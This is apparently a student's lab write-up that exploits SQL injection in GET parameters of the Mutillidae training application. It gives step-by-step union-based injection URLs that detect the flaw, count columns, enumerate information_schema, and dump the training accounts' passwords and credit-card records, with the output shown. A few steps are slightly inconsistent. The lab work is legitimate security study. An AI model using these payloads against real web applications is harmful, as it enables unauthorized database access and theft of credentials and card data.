### Discovering SQL Injections in GET

* In the previous labs i was injecting SQL statements in the text field where the username and password are.
* Now i'm going to test in the url which is GET HTTP Method.

* So i'm first going to to inject a single quote to see if the page is vulnerable.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=admin%27&password=&user-info-php-submit-button=View+Account+Details
```

```
SELECT * FROM accounts WHERE username='admin'' AND password=''

You have an error in your SQL syntax;
```

* So yes the its vulnerable.
* Now lets say we want to find the number of columns in a particular table, we can use the order by SQL statement.

* We would use the following statement.

```
SELECT * FROM accounts WHERE username='admin' order by 1#' and password=''
```

* The query after the comment will not be executed.
```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20order%20by%201%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* We have to url encode non printable characters.

* Now we recieve two users.

```
Username=noone
Password=noone
Signature=noone

Username=noone
Password=noone
Signature=noone 
```

* I accidently created two same users.

* Now we can check how many columns there are in the table through trial and error.
* We first start off by order by 12 to see if there are 12 columns in the table.

```
Error executing query: Unknown column '12' in 'order clause'
```

* It give me a error telling me that there are isn't 12 columns in the table.
* So now we can try a lower number maybe 6.

```
Error executing query: Unknown column '6' in 'order clause'
```
```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20order%20by%206%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* Same error so we can try a smaller number, we will try 3.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20order%20by%206%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* No error so we know we have 3 columns in table.

* No let me try 5.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20order%20by%205%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* This means we have 5 columns in table, as we have tried 6 columns and that gave us error.

---

### Reading Database Information


* Now we found out there are 5 columns, we can now select data from the columns.
* This can be done using union statement.
* The union statement is used to combine multiple select statements.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20union%20select%201,2,3,4,5%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* Now i recieve the following

```
Username=2
Password=3
Signature=4
```

* The numbers next to username, password, signature indicates that whatever sql query you place inside those numbers it will be displayed on that field.

* So now i'm going to insert database() in the second field, user() in the third field and version() in the fourth field.
* database() = This will tell me the database that is being used.
* user() = What user is currently logged in as as the database.
* version() = The version of the database.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20union%20select%201,database(),user(),version(),5%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* The output i recieve is the following.

```
Username=owasp10
Password=root@localhost
Signature=5.0.51a-3ubuntu5
```

* Which shows me the database name, username logged for the database and the database version.


---

### Finding Database Tables

* Now that we have found the database name, user for database, and the version of database. Lets start finding the database tables.
* So first i'm to replace the third and fourth fields with null.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20union%20select%201,database(),null,null,5%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* Now we are going get the table names from information_schema which by default is created by mysql.
* This database contains information for all the other database so meta database.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20union%20select%201,database(),user(),version(),5 from information_schema.tables%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* So what this query does is grabs the tables from information_schema and grabs a table name table_name.
* Now we recieve the following output.

```
Username=CHARACTER_SETS
Password=
Signature=

Username=COLLATIONS
Password=
Signature=

Username=COLLATION_CHARACTER_SET_APPLICABILITY
Password=
Signature=

Username=COLUMNS
Password=
Signature=

Username=COLUMN_PRIVILEGES
Password=
Signature=

Username=KEY_COLUMN_USAGE
Password=
Signature=

Username=PROFILING
Password=
Signature=

Username=ROUTINES
Password=
Signature=

Username=SCHEMATA
Password=
Signature=

Username=SCHEMA_PRIVILEGES
Password=
Signature=

Username=STATISTICS
Password=
Signature=

Username=TABLES
Password=
Signature=

Username=TABLE_CONSTRAINTS
Password=
Signature=

Username=TABLE_PRIVILEGES
Password=
Signature=

Username=TRIGGERS
Password=
Signature=

Username=USER_PRIVILEGES
Password=
Signature=

Username=VIEWS
Password=
Signature=

Username=guestbook
Password=
Signature=

Username=users
Password=
Signature=

Username=columns_priv
Password=
Signature=

Username=db
Password=
Signature=

Username=func
Password=
Signature=

Username=help_category
Password=
Signature=

Username=help_keyword
Password=
Signature=

Username=help_relation
Password=
Signature=

Username=help_topic
Password=
Signature=

Username=host
Password=
Signature=

Username=proc
Password=
Signature=

Username=procs_priv
Password=
Signature=

Username=tables_priv
Password=
Signature=

Username=time_zone
Password=
Signature=

Username=time_zone_leap_second
Password=
Signature=

Username=time_zone_name
Password=
Signature=

Username=time_zone_transition
Password=
Signature=

Username=time_zone_transition_type
Password=
Signature=

Username=user
Password=
Signature=

Username=accounts
Password=
Signature=

Username=blogs_table
Password=
Signature=

Username=captured_data
Password=
Signature=

Username=credit_cards
Password=
Signature=

Username=hitlog
Password=
Signature=

Username=pen_test_tools
Password=
Signature=

Username=galaxia_activities
Password=
Signature=

Username=galaxia_activity_roles
Password=
Signature=

Username=galaxia_instance_activities
Password=
Signature=

Username=galaxia_instance_comments
Password=
Signature=

Username=galaxia_instances
Password=
Signature=

Username=galaxia_processes
Password=
Signature=

Username=galaxia_roles
Password=
Signature=

Username=galaxia_transitions
Password=
Signature=

Username=galaxia_user_roles
Password=
Signature=

Username=galaxia_workitems
Password=
Signature=

Username=messu_archive
Password=
Signature=

Username=messu_messages
Password=
Signature=

Username=messu_sent
Password=
Signature=

Username=sessions
Password=
Signature=

Username=tiki_actionlog
Password=
Signature=

Username=tiki_article_types
Password=
Signature=

Username=tiki_articles
Password=
Signature=

Username=tiki_banners
Password=
Signature=

Username=tiki_banning
Password=
Signature=

Username=tiki_banning_sections
Password=
Signature=

Username=tiki_blog_activity
Password=
Signature=

Username=tiki_blog_posts
Password=
Signature=

Username=tiki_blog_posts_images
Password=
Signature=

Username=tiki_blogs
Password=
Signature=

Username=tiki_calendar_categories
Password=
Signature=

Username=tiki_calendar_items
Password=
Signature=

Username=tiki_calendar_locations
Password=
Signature=

Username=tiki_calendar_roles
Password=
Signature=

Username=tiki_calendars
Password=
Signature=

Username=tiki_categories
Password=
Signature=

Username=tiki_categorized_objects
Password=
Signature=

Username=tiki_category_objects
Password=
Signature=

Username=tiki_category_sites
Password=
Signature=

Username=tiki_chart_items
Password=
Signature=

Username=tiki_charts
Password=
Signature=

Username=tiki_charts_rankings
Password=
Signature=

Username=tiki_charts_votes
Password=
Signature=

Username=tiki_chat_channels
Password=
Signature=

Username=tiki_chat_messages
Password=
Signature=

Username=tiki_chat_users
Password=
Signature=

Username=tiki_comments
Password=
Signature=

Username=tiki_content
Password=
Signature=

Username=tiki_content_templates
Password=
Signature=

Username=tiki_content_templates_sections
Password=
Signature=

Username=tiki_cookies
Password=
Signature=

Username=tiki_copyrights
Password=
Signature=

Username=tiki_directory_categories
Password=
Signature=

Username=tiki_directory_search
Password=
Signature=

Username=tiki_directory_sites
Password=
Signature=

Username=tiki_download
Password=
Signature=

Username=tiki_drawings
Password=
Signature=

Username=tiki_dsn
Password=
Signature=

Username=tiki_dynamic_variables
Password=
Signature=

Username=tiki_eph
Password=
Signature=

Username=tiki_extwiki
Password=
Signature=

Username=tiki_faq_questions
Password=
Signature=

Username=tiki_faqs
Password=
Signature=

Username=tiki_featured_links
Password=
Signature=

Username=tiki_file_galleries
Password=
Signature=

Username=tiki_file_handlers
Password=
Signature=

Username=tiki_files
Password=
Signature=

Username=tiki_forum_attachments
Password=
Signature=

Username=tiki_forum_reads
Password=
Signature=

Username=tiki_forums
Password=
Signature=

Username=tiki_forums_queue
Password=
Signature=

Username=tiki_forums_reported
Password=
Signature=

Username=tiki_friends
Password=
Signature=

Username=tiki_friendship_requests
Password=
Signature=

Username=tiki_galleries
Password=
Signature=

Username=tiki_galleries_scales
Password=
Signature=

Username=tiki_games
Password=
Signature=

Username=tiki_group_inclusion
Password=
Signature=

Username=tiki_history
Password=
Signature=

Username=tiki_hotwords
Password=
Signature=

Username=tiki_html_pages
Password=
Signature=

Username=tiki_html_pages_dynamic_zones
Password=
Signature=

Username=tiki_images
Password=
Signature=

Username=tiki_images_data
Password=
Signature=

Username=tiki_integrator_reps
Password=
Signature=

Username=tiki_integrator_rules
Password=
Signature=

Username=tiki_language
Password=
Signature=

Username=tiki_languages
Password=
Signature=

Username=tiki_link_cache
Password=
Signature=

Username=tiki_links
Password=
Signature=

Username=tiki_live_support_events
Password=
Signature=

Username=tiki_live_support_message_comments
Password=
Signature=

Username=tiki_live_support_messages
Password=
Signature=

Username=tiki_live_support_modules
Password=
Signature=

Username=tiki_live_support_operators
Password=
Signature=

Username=tiki_live_support_requests
Password=
Signature=

Username=tiki_logs
Password=
Signature=

Username=tiki_mail_events
Password=
Signature=

Username=tiki_mailin_accounts
Password=
Signature=

Username=tiki_menu_languages
Password=
Signature=

Username=tiki_menu_options
Password=
Signature=

Username=tiki_menus
Password=
Signature=

Username=tiki_minical_events
Password=
Signature=

Username=tiki_minical_topics
Password=
Signature=

Username=tiki_modules
Password=
Signature=

Username=tiki_newsletter_groups
Password=
Signature=

Username=tiki_newsletter_subscriptions
Password=
Signature=

Username=tiki_newsletters
Password=
Signature=

Username=tiki_newsreader_marks
Password=
Signature=

Username=tiki_newsreader_servers
Password=
Signature=

Username=tiki_object_ratings
Password=
Signature=

Username=tiki_page_footnotes
Password=
Signature=

Username=tiki_pages
Password=
Signature=

Username=tiki_pageviews
Password=
Signature=

Username=tiki_poll_objects
Password=
Signature=

Username=tiki_poll_options
Password=
Signature=

Username=tiki_polls
Password=
Signature=

Username=tiki_preferences
Password=
Signature=

Username=tiki_private_messages
Password=
Signature=

Username=tiki_programmed_content
Password=
Signature=

Username=tiki_quicktags
Password=
Signature=

Username=tiki_quiz_question_options
Password=
Signature=

Username=tiki_quiz_questions
Password=
Signature=

Username=tiki_quiz_results
Password=
Signature=

Username=tiki_quiz_stats
Password=
Signature=

Username=tiki_quiz_stats_sum
Password=
Signature=

Username=tiki_quizzes
Password=
Signature=

Username=tiki_received_articles
Password=
Signature=

Username=tiki_received_pages
Password=
Signature=

Username=tiki_referer_stats
Password=
Signature=

Username=tiki_related_categories
Password=
Signature=

Username=tiki_rss_feeds
Password=
Signature=

Username=tiki_rss_modules
Password=
Signature=

Username=tiki_score
Password=
Signature=

Username=tiki_search_stats
Password=
Signature=

Username=tiki_searchindex
Password=
Signature=

Username=tiki_searchsyllable
Password=
Signature=

Username=tiki_searchwords
Password=
Signature=

Username=tiki_secdb
Password=
Signature=

Username=tiki_semaphores
Password=
Signature=

Username=tiki_sent_newsletters
Password=
Signature=

Username=tiki_sessions
Password=
Signature=

Username=tiki_sheet_layout
Password=
Signature=

Username=tiki_sheet_values
Password=
Signature=

Username=tiki_sheets
Password=
Signature=

Username=tiki_shoutbox
Password=
Signature=

Username=tiki_shoutbox_words
Password=
Signature=

Username=tiki_stats
Password=
Signature=

Username=tiki_structure_versions
Password=
Signature=

Username=tiki_structures
Password=
Signature=

Username=tiki_submissions
Password=
Signature=

Username=tiki_suggested_faq_questions
Password=
Signature=

Username=tiki_survey_question_options
Password=
Signature=

Username=tiki_survey_questions
Password=
Signature=

Username=tiki_surveys
Password=
Signature=

Username=tiki_tags
Password=
Signature=

Username=tiki_theme_control_categs
Password=
Signature=

Username=tiki_theme_control_objects
Password=
Signature=

Username=tiki_theme_control_sections
Password=
Signature=

Username=tiki_topics
Password=
Signature=

Username=tiki_tracker_fields
Password=
Signature=

Username=tiki_tracker_item_attachments
Password=
Signature=

Username=tiki_tracker_item_comments
Password=
Signature=

Username=tiki_tracker_item_fields
Password=
Signature=

Username=tiki_tracker_items
Password=
Signature=

Username=tiki_tracker_options
Password=
Signature=

Username=tiki_trackers
Password=
Signature=

Username=tiki_translated_objects
Password=
Signature=

Username=tiki_untranslated
Password=
Signature=

Username=tiki_user_answers
Password=
Signature=

Username=tiki_user_answers_uploads
Password=
Signature=

Username=tiki_user_assigned_modules
Password=
Signature=

Username=tiki_user_bookmarks_folders
Password=
Signature=

Username=tiki_user_bookmarks_urls
Password=
Signature=

Username=tiki_user_mail_accounts
Password=
Signature=

Username=tiki_user_menus
Password=
Signature=

Username=tiki_user_modules
Password=
Signature=

Username=tiki_user_notes
Password=
Signature=

Username=tiki_user_postings
Password=
Signature=

Username=tiki_user_preferences
Password=
Signature=

Username=tiki_user_quizzes
Password=
Signature=

Username=tiki_user_taken_quizzes
Password=
Signature=

Username=tiki_user_tasks
Password=
Signature=

Username=tiki_user_tasks_history
Password=
Signature=

Username=tiki_user_votings
Password=
Signature=

Username=tiki_user_watches
Password=
Signature=

Username=tiki_userfiles
Password=
Signature=

Username=tiki_userpoints
Password=
Signature=

Username=tiki_users
Password=
Signature=

Username=tiki_users_score
Password=
Signature=

Username=tiki_webmail_contacts
Password=
Signature=

Username=tiki_webmail_messages
Password=
Signature=

Username=tiki_wiki_attachments
Password=
Signature=

Username=tiki_zones
Password=
Signature=

Username=users_grouppermissions
Password=
Signature=

Username=users_groups
Password=
Signature=

Username=users_objectpermissions
Password=
Signature=

Username=users_permissions
Password=
Signature=

Username=users_usergroups
Password=
Signature=

Username=users_users
Password=
Signature=

```

* So we can see we recieved a lot of tables.
* As we are logged in as root we are getting tables from other databases.
* We only want tables from this database which is owasp10
* To get tables from the owasp10 we have to execute the following statement.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20union%20select%201,table_name,null,null,5%20from%20information_schema.tables where table_schema ='owasp10'%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* And i recieve 8 records

```
Username=noone
Password=noone
Signature=noone

Username=noone
Password=noone
Signature=noone

Username=accounts
Password=
Signature=

Username=blogs_table
Password=
Signature=

Username=captured_data
Password=
Signature=

Username=credit_cards
Password=
Signature=

Username=hitlog
Password=
Signature=

Username=pen_test_tools
Password=
Signature=
```

---

### Extracting Sensitive Data 

* Now we have retrieved some table in the previous section.
* In this section we will get the columns from th accounts table and then retreieve the data inside it.

* So first we need to find the names for the columns in the account table.
* So we will have to select all the columns in the table accounts.

* The first thing we change is the table_name to colum_name
* Then we change the information_schema.tables to information_schema.columns.
* Now we change the where table_name = 'owasp10' to where column_name = 'accounts'

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* The output is the following;

```
Username=username
Password=
Signature=

Username=password
Password=
Signature=

Username=mysignature
Password=
Signature=

Username=is_admin
Password=
Signature=
```

* From here i going to select the username, password and isadmin columns.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* We recieved the following information back.

```
Username=noone
Password=noone
Signature=noone

Username=noone
Password=noone
Signature=noone

Username=admin
Password=adminpass
Signature=TRUE

Username=adrian
Password=somepassword
Signature=TRUE

Username=john
Password=monkey
Signature=FALSE

Username=jeremy
Password=password
Signature=FALSE

Username=bryce
Password=password
Signature=FALSE

Username=samurai
Password=samurai
Signature=FALSE

Username=jim
Password=password
Signature=FALSE

Username=bobby
Password=password
Signature=FALSE

Username=simba
Password=password
Signature=FALSE

Username=dreveil
Password=password
Signature=FALSE

Username=scotty
Password=password
Signature=FALSE

Username=cal
Password=password
Signature=FALSE

Username=john
Password=password
Signature=FALSE

Username=kevin
Password=42
Signature=FALSE

Username=dave
Password=set
Signature=FALSE

Username=ed
Password=pentest
Signature=FALSE

Username=noone
Password=noone
Signature=
```

* Just to try another example and see if we can retrieve the data from the credit cards table.

* First we need to find out the columns that present in this table.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27credit_cards%27%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* Output

```
Username=ccid
Password=
Signature=

Username=ccnumber
Password=
Signature=

Username=ccv
Password=
Signature=

Username=expiration
Password=
Signature=
```

* So i'm going to retreive the data from the ccnumber, ccv, and expiration columns.

```
http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=noone%27%20union%20select%201,ccnumber,ccv,expiration,5%20from%20credit_cards%23&password=noone&user-info-php-submit-button=View+Account+Details
```

* The display output.

```
Username=4444111122223333
Password=745
Signature=2012-03-01

Username=7746536337776330
Password=722
Signature=2015-04-01

Username=8242325748474749
Password=461
Signature=2016-03-01

Username=7725653200487633
Password=230
Signature=2017-06-01

Username=1234567812345678
Password=627
Signature=2018-11-01
```


